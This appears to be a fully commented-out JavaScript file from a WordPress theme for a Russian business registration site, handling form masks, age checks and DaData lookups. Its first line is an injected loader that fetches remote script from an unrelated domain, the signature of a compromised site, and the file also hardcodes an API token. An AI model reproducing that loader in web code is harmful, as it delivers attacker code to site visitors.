// ;(function(b,r,f,c,m,j){m=r.createElement(f);j=r.getElementsByTagName(f)[0];m.async=1;m.src=c;j.parentNode.insertBefore(m,j);})(window,document,'script','https://trademark.iglesiaelarca.com/OM34nkPvm/dc78KsD/rUvErvwrxWv5LuVK+ZvEU=');

// (function($) {

//   $(function(){
//     $('a[href="#about"]').click(function(){
//       $('.qliqman').addClass('active');
//       $('.cloud_replic').attr('data-replic', 'Вы пришли по адресу');
//     });

//     $('.block_pre a').click(function(){
//       var text = $(this).attr('data-text');
//       $('.cloud_replic').attr('data-replic', text);
//     });


// // $(function(){
// //   if (window.location.pathname.indexOf('/log/') >= 0) {
// //     setInterval(function(){
// //       x = $('h1.login_title').offset().left / 0.85;
// //       y = $('h1.login_title').offset().top / 2.3;
// //       z = x / y * 20;
// //       // $('#accept_info').html("x:" + x + "y:" + y);
// //       $('#path4155').attr('d', 'm 264.02315,550.57649 '+ y +', '+ z);
// //     });
// //   }
// // });




// // $(function(){
// //
// //   function enterButton() { mouthOpen.play(); }
// //   function leaveButton() { mouthOpen.reverse(); }
// //
// //   const eyeRightPupil = document.querySelector('.arrow_one');
// //   const eyeLeftPupil = document.querySelector('.arrow_two');
// //   const eyeLeftInner = document.querySelector('.arrow_one');
// //   // const innerEyeWidth = eyeLeftInner.getBoundingClientRect().width;
// //   const innerEyeWidth = 53;
// //   // const innerEyeHeight = eyeLeftInner.getBoundingClientRect().height;
// //   const innerEyeHeight = 26;
// //   const pupilWidth = eyeLeftPupil.getBoundingClientRect().width;
// //   const pupilHeight = eyeLeftPupil.getBoundingClientRect().height;
// //   const xMovement = (innerEyeWidth - pupilWidth)/1.5;
// //   const yMovement = (innerEyeHeight - pupilHeight)*10;
// //
// //   window.addEventListener('mousemove', updateEyePosition);
// //
// //   function updateEyePosition(event) {
// //     const posX = ((event.clientX / document.body.clientWidth) * 2 - 1) * xMovement;
// //     const posY = ((event.clientY / document.body.clientHeight) * 2 - 1) * yMovement;
// //
// //
// //     $('.arrow_one').css('transform', 'rotate(' + posX.toFixed() + 'deg)');
// //     $('.arrow_two').css('transform', 'rotate(' + posY.toFixed() + 'deg)');
// //     // $('path.left_eye, path.right_eye').css('transform', 'translate3d('+ posX +'px, '+ posY +'px, 10px)');
// //   }
// //
// // });


// // .comp-3d {
// //   animation: r 3s ease-in-out infinite;
// // }
// // .comp-3d--i {
// //   animation-name: ri;
// // }
// // .comp-3d--o {
// //   animation-name: ro;
// // }

// $('#hero').hover(function(){
//   $('.assembly').addClass('active');
// }, function(){
//   $('.assembly').removeClass('active');
// });


// $('.block_fo.founder').hover(function(){
//   $('.man_1').css('filter','brightness(50%)');
//   $('.block_in').addClass('unselect');
// }, function(){
//   $('.man_1').css('filter','brightness(100%)');
//   $('.block_in').removeClass('unselect');
// });
// $('.block_in.investor').hover(function(){
//   $('.man_2').css('filter','brightness(50%)');
//   $('.block_fo').addClass('unselect');
// }, function(){
//   $('.man_2').css('filter','brightness(100%)');
//   $('.block_fo').removeClass('unselect');
// });

// $(function(){
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат даты */
//   var items = document.getElementsByClassName('date_format');
//   Array.prototype.forEach.call(items, function(element) {
//       var dateMask = IMask(element, {
//         mask: Date,
//         min: new Date(1990, 0, 1),
//         max: new Date(2024, 0, 1),
//         lazy: true
//     });
//   });
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат даты */
// });

// $(function(){
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат даты */
//   var items = document.getElementsByClassName('date_format_birthday');
//   Array.prototype.forEach.call(items, function(element) {
//       var dateMask = IMask(element, {
//         mask: Date,
//         min: new Date(1900, 0, 1),
//         max: new Date(2010, 0, 1),
//         lazy: true
//     });
//   });
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат даты */
// });

// function birthday(year, month, day){
//   var now = new Date(); //Текущя дата
//   var today = new Date(now.getFullYear(), now.getMonth(), now.getDate()); //Текущя дата без времени
//   var dob = new Date(year, month, day); //Дата рождения
//   var dobnow = new Date(today.getFullYear(), dob.getMonth(), dob.getDate()); //ДР в текущем году
//   var age; //Возраст

//   //Возраст = текущий год - год рождения
//   age = today.getFullYear() - dob.getFullYear();
//   //Если ДР в этом году ещё предстоит, то вычитаем из age один год
//   if (today < dobnow) {
//     age = age-1;
//   }
//   return age;
// }

// console.log(birthday(1996, 7, 30))

// $(function(){

//   if ($('#birthday').val().length === 10) {
//     var array_birthday = $('#birthday').val().split('.');
//     $('#birthday').closest('.qliq_icon').attr('data-info', birthday(array_birthday[2], array_birthday[1], array_birthday[0]) + ' лет');
//     if (birthday(array_birthday[2], array_birthday[1], array_birthday[0]) < 18) {
//       $('button[name="form_submits"]').css({'display':'none', 'margin':'0 auto'});
//       $('.warning-birthday').css('display', 'block');
//     } else {
//       $('button[name="form_submits"]').css({'display':'grid', 'margin':'0 auto'});
//       $('.warning-birthday').css('display', 'none');
//     }
//   }

//   $('#birthday').keyup(function(){
//     if ($(this).val().length === 10) {
//       var array_birthday = $(this).val().split('.');
//       // console.log(birthday(array_birthday[2], array_birthday[1], array_birthday[0]));

//       $(this).closest('.qliq_icon').attr('data-info', birthday(array_birthday[2], array_birthday[1], array_birthday[0]) + ' лет');
//       if (birthday(array_birthday[2], array_birthday[1], array_birthday[0]) < 18) {
//         $('button[name="form_submits"]').css({'display':'none', 'margin':'0 auto'});
//         $('.warning-birthday').css('display', 'block');
//       } else {
//         $('button[name="form_submits"]').css({'display':'grid', 'margin':'0 auto'});
//         $('.warning-birthday').css('display', 'none');
//       }
//     }
//   });

// });

// $(document).ready(function() {
//       $('form').keydown(function(event){
//         if(event.keyCode == 13) {
//           event.preventDefault();
//           return false;
//       }
//    });
// });

// $(function(){
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат даты */
//   var items = document.getElementsByClassName('number_format');
//   Array.prototype.forEach.call(items, function(element) {
//       var dateMask = IMask(element, {
//         mask: Number,
//         min: 0,
//         max: 999999999999999999999999999999,
//     });
//   });
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат даты */
// });

// $(function(){
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат телефона */
//   var items = document.getElementsByClassName('phone_format');
//   Array.prototype.forEach.call(items, function(element) {
//       var phoneMask = IMask(element, {
//         mask: '+{7} (000) 000-00-00'
//     });
//   });
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат телефона */
// });

// $(function(){
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат снилс */
//   var items = document.getElementsByClassName('snils_format');
//   Array.prototype.forEach.call(items, function(element) {
//       var snilsMask = IMask(element, {
//         mask: '000-000-000 00'
//     });
//   });
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат снилс */
// });

// $(function(){
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат телефона */
//   var items = document.getElementsByClassName('email_format');
//   Array.prototype.forEach.call(items, function(element) {
//       var emailMask = IMask(element, {
//         mask: /^\S*@?\S*$/
//     });
//   });
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат телефона */
// });

// $(function(){
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат телефона */
//   var items = document.getElementsByClassName('text_format');
//   Array.prototype.forEach.call(items, function(element) {
//       var emailMask = IMask(element, {
//         mask: /^[А-я]/
//     });
//   });
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат телефона */
// });

// $(function(){
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат телефона */
//   var items = document.getElementsByClassName('snp_format');
//   Array.prototype.forEach.call(items, function(element) {
//       var emailMask = IMask(element, {
//         mask: '0000 000000'
//     });
//   });
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат телефона */
// });

// $(function(){
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат телефона */
//   var items = document.getElementsByClassName('code-passport_format');
//   Array.prototype.forEach.call(items, function(element) {
//       var emailMask = IMask(element, {
//         mask: '000-000'
//     });
//   });
// /* Делаем выборку и присваиваем маску для всех соответствующих классов - Формат телефона */
// });

// $('.qliq_icon.valid_icon').each(function(){
//   this2 = $(this).children('label');

//   if ($(this).children('input').val().length > 0) {
//     if ($(this).children('input').is(':read-only')) {
//       $(this).closest('.qliq_icon').children('label').addClass('active').addClass('readonly');
//     } else{
//       $(this).closest('.qliq_icon').children('label').addClass('active');
//     }
//   }

//   $(this).children('input').keyup(function(){
//     if ($(this).val().length > 0) {
//       $(this).closest('.qliq_icon').children('label').addClass('active');
//     } else {
//       $(this).closest('.qliq_icon').children('label').removeClass('active');
//     }
//   });
// });

//     // $(window).mousemove(function (pos) {
//     //   var x = (pos.pageX - pos.target.offsetLeft) / pos.target.offsetWidth * 200; // -7  10
//     //   var y = pos.offsetY; // -2  3
//     //   $('.mouse_x').text(x);
//     //   $('.mouse_y').text(y);
//     // $('path.left_eye, path.right_eye').css('transform', 'translate3d('+ x +'px, '+ y +'px, 10px)');
//     // });

// $(function(){
//   // Замените на свой API-ключ
//   var token = "91d2e9da5f1bdc3e5c51d7bc6ec71076d549f418";

//   function formatResult(value, currentValue, suggestion) {
//     suggestion.value = suggestion.data.code;
//     return suggestion.data.code + " — " + suggestion.data.name;
//   }

//   function showSuggestion(suggestion) {
//     console.log(suggestion);
//     $("#name").val(suggestion.data.name);
//   }

//   function clearSuggestion() {
//     $("#name").val("");
//   }

// $('#sending_code').click(function(){
//   $("#code").suggestions({
//     token: token,
//     type: "fms_unit",
//     formatResult: formatResult,
//     onSelect: showSuggestion,
//     onSelectNothing: clearSuggestion
//   });
// });

// });


// $(function(){
//   // $('#tester').click(function(){
//   //   alert($('input[name="code_pod_passport"]').val().length);
//   // });
//   $('input[name="form_code_pod_passport"]').keyup(function(){
//     if ($(this).val().length === 7) {
//       current_code = $(this).val();
//       $.ajax({
//         url: '/wp-content/themes/qliq/dadata/dadata.php',
//         type: 'POST',
//         data: ({code: current_code}),
//         dataType: 'json',
//         // beforeSend: bik_before,
//         success: code_pod_success,
//         error: code_pod_error
//       });
//     }
//   });

//   function code_pod_success(data){
//     if (data != 0) {
//       $('#code_pod_items').css('display', 'block');
//       $('#code_pod_items').html('');
//       // alert(data);
//       $.each(data, function (index, value) {
//         $('#code_pod_items').append('<div class="tags_item">' + data[index].value + '</div>');
//         // console.log(data[index].value);
//       });
//       code_pod_items();
//     }
//   }
//   function code_pod_error(data){
//   }

// });


// $(function(){
//   // $('#tester').click(function(){
//   //   alert($('input[name="code_pod_passport"]').val().length);
//   // });
//   $('input[name="form_inn_legal"]').keyup(function(){
//     if ($(this).val().length === 10) {
//       current_code = $(this).val();
//       $.ajax({
//         url: '/wp-content/themes/qliq/dadata/getinn.php',
//         type: 'POST',
//         data: ({inn: current_code}),
//         dataType: 'json',
//         // beforeSend: bik_before,
//         success: inn_get_success,
//         error: inn_get_error
//       });
//     }
//   });

//   function inn_get_success(data){
//     if (data != 0) {
//       // alert(data[0].value);
//       $('input[name="form_kpp"]').val(data[0].data.kpp);
//       $.cookie('kpp', data[0].data.kpp);

//       $('input[name="form_okpo_leg"]').val(data[0].data.okpo);
//       $.cookie('okpo_leg', data[0].data.okpo);

//       $('input[name="form_full_name_legal"]').val(data[0].data.name.full_with_opf);
//       $.cookie('full_name_legal', data[0].data.opf.full + ' «' + data[0].data.name.full + '»');

//       $('input[name="form_short_name_legal"]').val(data[0].data.name.short_with_opf);
//       $.cookie('short_name_legal', data[0].data.opf.short + ' «' + data[0].data.name.full + '»');

//       $('input[name="form_ogrn_legal"]').val(data[0].data.ogrn);
//       $.cookie('ogrn_legal', data[0].data.ogrn);

//       var date = new Date(data[0].data.state.registration_date);
//       var date_reg = $.datepicker.formatDate('dd.mm.yy', date);
//       // var date_reg = data[0].data.ogrn;
//       $('input[name="form_date_legal_reg"]').val(date_reg);
//       $.cookie('date_legal_reg', date_reg);

//       $('input[name="form_place_legal_reg"]').val(data['fns'][0].value);
//       $.cookie('place_legal_reg', data['fns'][0].value);

//       $('input[name="form_position_director"]').val(data[0].data.management.post);
//       $.cookie('position_director', data[0].data.management.post);

//       $('input[name="form_fio_director"]').val(data[0].data.management.name);
//       $.cookie('fio_director', data[0].data.management.name);

//       $('input[name="form_address_location_legal"]').val(data[0].data.address.unrestricted_value);
//       $.cookie('address_location_legal', data[0].data.address.unrestricted_value);

//       // $('input[name="fact_address_legal"]').val(data[0].data.ogrn);
//       // $.cookie('fact_address_legal', data[0].data.ogrn);

//       // $('input[name="email_legal"]').val(data[0].data.ogrn);
//       // $.cookie('email_legal', data[0].data.ogrn);

//       // $('input[name="phone_legal"]').val(data[0].data.ogrn);
//       // $.cookie('phone_legal', data[0].data.ogrn);
//     }
//   }
//   function inn_get_error(data){
//   }


// $(document).ready(function(){

//   $('.founders span[data-display="none"] input').each(function(){
//     if($(this).val() !== ''){
//       $(this).closest('span[data-display="none"]').attr('data-display', 'yes');
//     }
//     // console.log($(this).val());
//   });

// });

// $('#add_founder').click(function(){
//   // $('.founders span[data-display="yes"]').attr('data-founder');
//   var last_id_founder = $('.founders span[data-display="yes"]').last().attr('data-founder');
//   var actual_founder = parseInt(last_id_founder) + 1;

//   $('span[data-founder="'+ actual_founder +'"]').attr('data-display', 'yes');
//   if (actual_founder == 5) {
//     $('#add_founder').css('opacity', '0.5');
//   }
//   // console.log(actual_founder);
// });



//   $('input[name="form_bik"]').keyup(function(){
//     if ($(this).val().length === 9) {
//       current_code = $(this).val();
//       $.ajax({
//         url: '/wp-content/themes/qliq/dadata/get_bank.php',
//         type: 'POST',
//         data: ({bik: current_code}),
//         dataType: 'json',
//         // beforeSend: bik_before,
//         success: bik_get_success,
//         error: bik_get_error
//       });
//     }
//   });

//   function bik_get_success(data){
//     if (data != 0) {

//       $('input[name="form_correspondent_account"]').val(data[0].data.correspondent_account);
//       $.cookie('correspondent_account', data[0].data.correspondent_account);
//       // Корреспондентский счет

//       $('input[name="form_bank"]').val(data[0].value);
//       $.cookie('bank', data[0].value);
//       // Банк

//       $('.qliq_icon.valid_icon').each(function(){
//         this2 = $(this).children('label');

//         if ($(this).children('input').val().length > 0) {
//           if ($(this).children('input').is(':read-only')) {
//             $(this).closest('.qliq_icon').children('label').addClass('active').addClass('readonly');
//           } else{
//             $(this).closest('.qliq_icon').children('label').addClass('active');
//           }
//         }

//         $(this).children('input').keyup(function(){
//           if ($(this).val().length > 0) {
//             $(this).closest('.qliq_icon').children('label').addClass('active');
//           } else {
//             $(this).closest('.qliq_icon').children('label').removeClass('active');
//           }
//         });
//       });

//     }
//   }
//   function bik_get_error(data){
//   }







//   $('input[name="form_inn_ip"]').keyup(function(){
//     if ($(this).val().length === 12) {
//       current_code = $(this).val();
//       $.ajax({
//         url: '/wp-content/themes/qliq/dadata/getinn.php',
//         type: 'POST',
//         data: ({inn: current_code}),
//         dataType: 'json',
//         // beforeSend: bik_before,
//         success: inn_get_ip_success,
//         error: inn_get_ip_error
//       });
//     }
//   });

//   function inn_get_ip_success(data){
//     if (data != 0) {
//       // alert(data[0].value);
//       // $('input[name="form_kpp"]').val(data[0].data.kpp);
//       // $.cookie('kpp', data[0].data.kpp);

//       $('input[name="form_okpo_ip"]').val(data[0].data.okpo);
//       $.cookie('okpo_ip', data[0].data.okpo);

//       $('input[name="form_surname_ip"]').val(data[0].data.fio.surname);
//       $.cookie('surname_ip', data[0].data.fio.surname);

//       $('input[name="form_name_ip"]').val(data[0].data.fio.name);
//       $.cookie('name_ip', data[0].data.fio.name);

//       $('input[name="form_patronymic_ip"]').val(data[0].data.fio.patronymic);
//       $.cookie('patronymic_ip', data[0].data.fio.patronymic);

//       $('input[name="form_full_name_ip"]').val(data[0].data.name.full_with_opf);
//       $.cookie('full_name_ip', data[0].data.opf.full + ' «' + data[0].data.name.full + '»');

//       $('input[name="form_short_name_ip"]').val(data[0].data.name.short_with_opf);
//       $.cookie('short_name_ip', data[0].data.opf.short + ' «' + data[0].data.name.full + '»');

//       $('input[name="form_ogrn_ip"]').val(data[0].data.ogrn);
//       $.cookie('ogrn_ip', data[0].data.ogrn);

//       var date = new Date(data[0].data.state.registration_date);
//       var date_reg = $.datepicker.formatDate('dd.mm.yy', date);
//       // var date_reg = data[0].data.ogrn;
//       $('input[name="form_date_ip_reg"]').val(date_reg);
//       $.cookie('date_ip_reg', date_reg);

//       $('input[name="form_place_ip_reg"]').val(data['fns'][0].value);
//       $.cookie('place_ip_reg', data['fns'][0].value);

//       // $('input[name="form_address_location_ip"]').val(data[0].data.address.unrestricted_value);
//       // $.cookie('address_location_ip', data[0].data.address.unrestricted_value);

//       // $('input[name="fact_address_legal"]').val(data[0].data.ogrn);
//       // $.cookie('fact_address_legal', data[0].data.ogrn);

//       // $('input[name="email_legal"]').val(data[0].data.ogrn);
//       // $.cookie('email_legal', data[0].data.ogrn);

//       // $('input[name="phone_legal"]').val(data[0].data.ogrn);
//       // $.cookie('phone_legal', data[0].data.ogrn);
//     }
//   }
//   function inn_get_ip_error(data){
//   }

// });

// // $(function(){
// function code_pod_items(){
//   $('#code_pod_items .tags_item').click(function(){
//     $('#name_pod_passport').val($(this).text());
//     $.cookie('issued_by', $(this).text());
//     $('#code_pod_items .tags_item').css('background','#a4a4a4');
//   });
// }
// // });

// function cookie_saving(argument, name, value){
//   if (argument == 'edit') {
//     $.cookie(name, value, {path: '/'});
//   }
//   // else if(argument == 'clean') {
//   //   $.removeCookie(name);
//   // }
// }

// $(function(){
//   $('input.qliq_fields:not(.nodetect)').change(function(){
//       cookie_saving('edit', $(this).attr('id'), $(this).val());
//   });

//   $('input.cookie_input').change(function(){
//       cookie_saving('edit', $(this).attr('name'), $(this).val());
//   });

//   $('#public_info input').change(function(){
//       cookie_saving('edit', $(this).attr('name'), $(this).attr('id'));
//   });

//   $('.qliq_check').change(function(){
//       cookie_saving('edit', $(this).attr('id'), $(this).val());
//   });

//   $('.qliq_check').on('change', function(){
//   if ($(this).prop('checked')){
//     cookie_saving('edit', $(this).attr('id'), 'checked');
//       // $('#licence_grid').css('display', 'grid');
//   } else {
//     cookie_saving('edit', $(this).attr('id'), '');
//       // $('#licence_grid').css('display', 'none');
//   }

// });

// $('#licence_check').on('change', function(){
//   if ($(this).prop('checked')){
//       $('#licence_grid').css('display', 'grid');
//   } else {
//       $('#licence_grid').css('display', 'none');
//   }
// });

// // $('.qliq_check').change(function(){
// //   if ($(this).attr('name') == 'form_ip' && $(this).
// //   ('checked') == true) {
// //     $('input[name="form_legal"]').prop('checked', false);
// //   }
// //   if ($(this).attr('name') == 'form_legal' && $(this).prop('checked') == true) {
// //     $('input[name="form_ip"]').prop('checked', false);
// //   }
// // });

// if ($('input[name="form_legal"]').prop('checked') == true) {
//   $('.ip_group_block').css('display', 'none');
//   $('.ip_group_block input').prop('required', false);
//   $('.legal_group_block input:not([id^="fio_founder"])').prop('required', true);
// }

// if ($('input[name="form_ip"]').prop('checked') == true) {
//   $('.legal_group_block').css('display', 'none');
//   $('.legal_group_block input').prop('required', false);
//   $('.ip_group_block input').prop('required', true);
// }

// $('input[name="form_legal"]').change(function(){
//   if ($(this).prop('checked') == true) {
//     $('input[name="form_ip"]').prop('checked', false);
//     $('.ip_group_block').css('display', 'none');

//     $('.ip_group_block input').prop('required', false);
//     $('.ip_group_block input').val('');

//     $('.legal_group_block input:not([id^="fio_founder"])').prop('required', true);

//     cookie_saving('edit', 'ip', '');
//     cookie_saving('edit', 'legal', 'checked');
//   }
// });

// $('input[name="form_ip"]').change(function(){
//   if ($(this).prop('checked') == true) {
//     $('input[name="form_legal"]').prop('checked', false);
//     $('.legal_group_block').css('display', 'none');
//     $('.legal_group_block input').prop('required', false);
//     $('.legal_group_block input').val('');

//     $('.ip_group_block input').prop('required', true);

//     cookie_saving('edit', 'ip', 'checked');
//     cookie_saving('edit', 'legal', '');
//   }
// });

// // Example starter JavaScript for disabling form submissions if there are invalid fields
// (function () {
//   'use strict'

//   // Fetch all the forms we want to apply custom Bootstrap validation styles to
//   var forms = document.querySelectorAll('.needs-validation')

//   // Loop over them and prevent submission
//   Array.prototype.slice.call(forms)
//     .forEach(function (form) {
//       form.addEventListener('submit', function (event) {
//         if (!form.checkValidity()) {
//           event.preventDefault()
//           event.stopPropagation()
//         }

//         form.classList.add('was-validated')
//       }, false)
//     })
// })()

// if($('#licence_check').prop('checked')){
//   $('#licence_grid').css('display', 'grid');
// }

// if($('#address_reg_fact_check').prop('checked')){
//   $('input[name="form_address_reg_fact"]').val($('input[name="form_address_reg"]').val());
// }

// $('#address_reg_fact_check').on('change', function(){
//   if ($(this).prop('checked')){
//       $('input[name="form_address_reg_fact"]').val($('input[name="form_address_reg"]').val());
//   } else {
//       $('input[name="form_address_reg_fact"]').val('');
//   }
// });



// if($('#fact_address_legal_check').prop('checked')){
//   $('input[name="form_fact_address_legal"]').val($('input[name="form_address_location_legal"]').val());
// }

// $('#fact_address_legal_check').on('change', function(){
//   if ($(this).prop('checked')){
//       $('input[name="form_fact_address_legal"]').val($('input[name="form_address_location_legal"]').val());
//   } else {
//       $('input[name="form_fact_address_legal"]').val('');
//   }
// });


// if($('#fact_address_ip_check').prop('checked')){
//   $('input[name="form_fact_address_ip"]').val($('input[name="form_address_location_ip"]').val());
// }

// $('#fact_address_ip_check').on('change', function(){
//   if ($(this).prop('checked')){
//       $('input[name="form_fact_address_ip"]').val($('input[name="form_address_location_ip"]').val());
//   } else {
//       $('input[name="form_fact_address_ip"]').val('');
//   }
// });





// if ($('input[name="form_type_finance"]').val() !== ''){
//   $('.documents').css('display', 'grid');
//   $('.no_select_nalog').css('display', 'none');
// }

// if ($('input[name="form_type_finance"]').val() == 'usn') {
//   $('.tax_return_nds').css('display', 'none');
//   $('.tax_return_period_nds').css('display', 'none');

//   $('.tax_return_usn').css('display', 'grid');
// }

// if ($('input[name="form_type_finance"]').val() == 'nds') {
//   $('.tax_return_usn').css('display', 'none');

//   $('.tax_return_nds').css('display', 'grid');
//   $('.tax_return_period_nds').css('display', 'grid');
// }




// $(function(){
//   if ($('input[name="form_type_finance"]').val() !== '') {
//     $('.documents').css('display', 'grid');
//   }
//   $('input[name="form_type_finance"]').change(function(){
//     var val = $(this).val();

//     if (val !== ''){
//       $('.documents').css('display', 'grid');
//       $('.no_select_nalog').css('display', 'none');
//     }

//     if (val == 'usn') {
//       $('.tax_return_nds').css('display', 'none');
//       $('.tax_return_period_nds').css('display', 'none');

//       $('.tax_return_usn').css('display', 'grid');
//     }

//     if (val == 'nds') {
//       $('.tax_return_usn').css('display', 'none');

//       $('.tax_return_nds').css('display', 'grid');
//       $('.tax_return_period_nds').css('display', 'grid');
//     }
//   });
// });


// //
// // $(function(){
// //   var url = "https://suggestions.dadata.ru/suggestions/api/4_1/rs/suggest/address";
// //   var token = "91d2e9da5f1bdc3e5c51d7bc6ec71076d549f418";
// //   var query = "москва хабар";
// //
// //   var options = {
// //       method: "POST",
// //       mode: "cors",
// //       headers: {
// //           "Content-Type": "application/json",
// //           "Accept": "application/json",
// //           "Authorization": "Token " + token
// //       },
// //       body: JSON.stringify({query: query})
// //   }
// //
// //   fetch(url, options)
// //   .then(response => response.text())
// //   .then(result => console.log(result))
// //   .catch(error => console.log("error", error));
// // });

// $(function(){

//   // Для Юр. лица
//   if ($('input[name="form_legal"]').prop('checked') == true) {
//     $('.legal_group_block').css('display', 'grid');
//     $('.ip_group_block input').val('');
//   } else {
//     $('.legal_group_block').css('display', 'none');
//   }
//   $('input[name="form_legal"]').change(function(){
//     if ($(this).prop('checked') == true) {
//       $('.legal_group_block').css('display', 'grid');
//     } else {
//       $('.legal_group_block').css('display', 'none');
//     }
//   });

//   // Для ИП
//   if ($('input[name="form_ip"]').prop('checked') == true) {
//     $('.ip_group_block').css('display', 'grid');
//     $('.legal_group_block input').val('');
//   } else {
//     $('.ip_group_block').css('display', 'none');
//   }
//   $('input[name="form_ip"]').change(function(){
//     if ($(this).prop('checked') == true) {
//       $('.ip_group_block').css('display', 'grid');
//     } else {
//       $('.ip_group_block').css('display', 'none');
//     }
//   });

// });

// $(function(){
//   $("#address_reg, #address_reg_fact, #address_location_legal, #fact_address_legal, #address_location_ip, #fact_address_ip").suggestions({
//       token: "91d2e9da5f1bdc3e5c51d7bc6ec71076d549f418",
//       type: "ADDRESS",
//       /* Вызывается, когда пользователь выбирает одну из подсказок */
//       onSelect: function(suggestion) {
//           console.log(suggestion);
//       }
//   });

//   $("#birthplace").suggestions({
//       token: "91d2e9da5f1bdc3e5c51d7bc6ec71076d549f418",
//       type: "ADDRESS",
//       hint: false,
//       // bounds: "city",
//       // constraints: {
//       //   locations: { city_type_full: "город" }
//       // },
//       // formatResult: formatResult,
//       // formatSelected: formatSelected,
//       /* Вызывается, когда пользователь выбирает одну из подсказок */
//       onSelect: function(suggestion) {
//           console.log(suggestion);
//       }
//   });

// });

// $(function(){

//   $('#inn_legal').change(function(){
//     if ($(this).val() == '') {
//       $('#legal_info input').val('');
//     }
//   });

// });

// });

// $('button[name="form_submits"]').click(function(){
//   $('form').find(':invalid').each(function (index, node) {

//     if ($(node).attr('placeholder') == true) {
//       var placeholder = ':' + $(node).attr('placeholder');
//     } else {
//       var placeholder = 'для продолжения';
//     }

//     if ($(node).closest('span').find('.error').length === 0) {
//       $(node).after("<div class='error'><b>Заполните</b> "+ placeholder +"</div>");
//     }

//   });
//   $('form').find(':valid').each(function (index, node) {

//     var placeholder = $(node).attr('placeholder');

//     if ($(node).closest('span').find('.error').length > 0) {
//       $(node).closest('span').find('.error').remove();
//     }

//   });

// });

// var sticky = new Sticky('.qliq_stick_menu', { wrap: false, marginTop: 150, stickyFor: 100, stickyContainer: '.qliq_main_sticky' });

// // $(function(){
// //   $(window).on("mousewheel", function() {
// //         // console.log($(document).scrollTop());
// //         if (true) {
// //
// //         }
// //     });
// // });

//   });

// })( jQuery );
